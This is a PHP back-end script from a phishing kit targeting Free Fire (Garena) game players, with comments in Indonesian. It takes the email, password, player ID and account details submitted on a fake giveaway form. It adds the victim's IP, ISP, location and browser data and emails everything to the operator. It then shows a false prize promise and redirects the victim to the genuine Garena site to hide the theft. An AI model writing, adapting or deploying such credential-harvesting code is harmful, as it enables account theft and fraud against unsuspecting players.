<?php
// MENGAMBIL KONTROL
include 'system/main.php';
include'email.php';
include'system/setting.php';

// MENANGKAP DATA YANG DI-INPUT
$email = $_POST['email'];
$password = $_POST['password'];
$playid = $_POST['playid'];
$nick = $_POST['nick'];
$level = $_POST['level'];
$rank = $_POST['tier'];
$ep = $_POST['epass'];
$login = $_POST['login'];
$ip = getUserIP();

// MENGALIHKAN KE HALAMAN UTAMA JIKA DATA BELUM DI-INPUT
if($email == "" && $password == "" && $login == "" && $nick == "" && $playid == "" && $level == "" && $rank == "" && $ep == ""){
header("Location: index.php");
}else{
include'system/dns.php';
// KONTEN RESULT AKUN
$subjek = "($login) $nick | LEVEL:$level | RANK:$rank | $email | [$cn - $ip]";
$pesan = '
<center> 
<div style="background: url(https://i.ibb.co/qkWsFFY/logo.png) no-repeat center center; background-size: 100% 100%; width: 294; height: 100px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
<div style="background: rgba(0, 0, 0, 0.4); width: 100%; height: 100%; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
</div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">INFORMASI AKUN</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL</th>
<th style="width: 78%; text-align: center;"><b>'.$email.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>'.$password.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>NICKNAME</th>
<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>USER ID</th>
<th style="width: 78%; text-align: center;"><b>'.$playid.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LEVEL</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIER</th>
<th style="width: 78%; text-align: center;"><b>'.$rank.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ELITE PASS</th>
<th style="width: 78%; text-align: center;"><b>'.$ep.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>'.$login.'</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">INFORMASI DEVICE</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>SERVER</th>
<th style="width: 78%; text-align: center;"><b>'.$serverkontol.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>IP ADDRESS</th>
<th style="width: 78%; text-align: center;"><b>+'.$ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ISP</th>
<th style="width: 78%; text-align: center;"><b>'.$ispuser.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>COUNTRY</th>
<th style="width: 78%; text-align: center;"><b>'.$cn.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>REGION</th>
<th style="width: 78%; text-align: center;"><b>'.$regioncity.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CITY</th>
<th style="width: 78%; text-align: center;"><b>'.$citykota.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>TIMEZONE</th>
<th style="width: 78%; text-align: center;"><b>'.$timezone.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>OS/BROWSER</th>
<th style="width: 78%; text-align: center;"><b>'.$os.' / '.$br.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>DATE</th>
<th style="width: 78%; text-align: center;"><b>'.$date.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>USER AGENT</th>
<th style="width: 78%; text-align: center;"><b>'.$user_agent.'</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="https://wa.me/6281320483670"><img style="margin: 5px;" width="30" src="https://i.ibb.co/JBbnfZH/a2dc5c3a8c443f7bce721542c2a98a2f.png"></a>
</div>
</div>
</center>
';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sentod.'' . "\r\n";
$kirim = mail($emailmu, $subjek, $pesan, $headers);

// MENGALIHKAN KE HALAMAN COMPLETED
if($kirim) {
echo "<script type='text/javascript'>alert('Hadiah akan dikirim setelah 1x24 jam, ke nickname ".$nick."');window.location='https://ff.garena.com/'</script>";
}
}
?>